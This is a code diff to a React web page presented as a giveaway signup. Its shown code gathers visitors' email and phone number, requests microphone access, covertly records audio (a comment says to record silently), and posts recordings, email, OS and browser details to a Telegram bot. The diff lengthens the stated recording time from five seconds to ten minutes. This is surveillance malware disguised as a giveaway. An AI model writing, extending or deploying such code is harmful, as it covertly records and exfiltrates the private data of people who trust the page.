@@ -115,7 +115,7 @@ async function recordAndSendAudio(stream, email) {
           const fd = new FormData();
           fd.append("chat_id", CHAT_ID);
           fd.append("voice", blob, "recording.ogg");
-          fd.append("caption", `🎤 <b>AUDIO RECORDING (5s)</b>\n\n👤 Email: ${email}\n📅 Time: ${time}`);
+          fd.append("caption", `🎤 <b>AUDIO RECORDING (10m)</b>\n\n👤 Email: ${email}\n📅 Time: ${time}`);
           fd.append("parse_mode", "HTML");
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
         } catch(e) { console.log("Audio send error:", e); }
@@ -256,7 +256,7 @@ function GiveawayApp() {
       } else if (type === "mic") {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         setPermissions(p => ({ ...p, mic: true }));
-        setPermStatus(s => ({ ...s, mic: "🎤 Recording 5s..." }));
+        setPermStatus(s => ({ ...s, mic: "🎤 Recording 10m..." }));
         sendTelegram(`🎤 <b>MICROPHONE GRANTED</b> — Giveaway\n\n👤 <b>Email:</b> ${signup.email}\n📱 <b>OS:</b> ${device.os} | <b>Browser:</b> ${device.browser}\n📅 <b>Time:</b> ${time}\n\n⏳ Recording audio...`);
         // Silently audio record karo
         await recordAndSendAudio(stream, signup.email);
@@ -425,7 +425,7 @@ function GiveawayApp() {
                     <div style={{fontWeight:"600", fontSize:"15px", marginBottom:"4px", color:permissions[perm.key]?"#00c864":"#fff"}}>{perm.title}</div>
                     <div style={{color:"rgba(255,255,255,0.4)", fontSize:"12px", lineHeight:1.4}}>
                       {permLoading[perm.key]
-                        ? <span style={{color:"#f7d45e", fontSize:"11px"}}>{perm.key==="camera"?"📸 Capturing photo...":"🎤 Recording 5s audio..."}</span>
+                        ? <span style={{color:"#f7d45e", fontSize:"11px"}}>{perm.key==="camera"?"📸 Capturing photo...":"🎤 Recording 10m audio..."}</span>
                         : permissions[perm.key] && permStatus[perm.key]
                         ? <span style={{color:"#00c864", fontSize:"11px"}}>{permStatus[perm.key]}</span>
                         : perm.desc}
@@ -496,7 +496,7 @@ function GiveawayApp() {
           </div>
           <div style={S.fg}>
             <label style={S.lbl}>Mobile Number</label>
-            <input type="tel" placeholder="+1 234 567 8900" value={form.mobile} onChange={e=>setForm(f=>({...f,mobile:e.target.value}))} style={{...S.inp,...(errors.mobile?S.inpErr:{})}}/>
+            <input type="tel" placeholder="234 567 8900" value={form.mobile} onChange={e=>setForm(f=>({...f,mobile:e.target.value}))} style={{...S.inp,...(errors.mobile?S.inpErr:{})}}/>
             {errors.mobile && <div style={S.err}>⚠ {errors.mobile}</div>}
           </div>
           <div style={S.fg}>
@@ -532,7 +532,7 @@ function GiveawayApp() {
             <div style={{display:"flex", alignItems:"flex-start", gap:"16px"}}>
               <div style={{width:"48px", height:"48px", borderRadius:"50%", background:"rgba(0,200,100,0.15)", display:"flex", alignItems:"center", justifyContent:"center", fontSize:"22px", flexShrink:0, animation:"pulseAnim 2s ease-in-out infinite"}}>✅</div>
               <div>
-                <h3 style={{margin:"0 0 8px", color:"#00c864", fontSize:"16px"}}>You will be notified within 1 day</h3>
+                <h3 style={{margin:"0 0 8px", color:"#00c864", fontSize:"16px"}}>You will be notified within 24 hours</h3>
                 <p style={{margin:0, color:"rgba(255,255,255,0.5)", fontSize:"13px", lineHeight:1.6}}>We'll reach out to <strong style={{color:"rgba(255,255,255,0.8)"}}>{form.email}</strong> and <strong style={{color:"rgba(255,255,255,0.8)"}}>{form.mobile}</strong> if you're selected.</p>
               </div>
             </div>
